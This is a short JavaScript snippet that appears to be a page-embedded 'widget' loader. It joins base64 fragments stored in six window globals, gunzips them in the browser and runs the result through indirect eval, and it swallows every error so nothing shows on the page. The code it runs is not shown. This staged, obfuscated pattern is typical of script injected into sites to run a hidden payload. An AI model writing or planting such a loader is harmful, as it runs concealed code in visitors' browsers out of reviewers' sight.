(function(){
  var b64 = '';
  for (var i = 1; i <= 6; i++) b64 += window['__SW' + i] || '';
  if (!b64) return;
  try{
    var bin = atob(b64), n = bin.length, bytes = new Uint8Array(n);
    for (var j = 0; j < n; j++) bytes[j] = bin.charCodeAt(j);
    new Response(new Response(bytes).body.pipeThrough(new DecompressionStream('gzip'))).text()
      .then(function(code){ (0, eval)(code); })
      .catch(function(){});
  }catch(e){ /* old browser - no widget, page unaffected */ }
})();
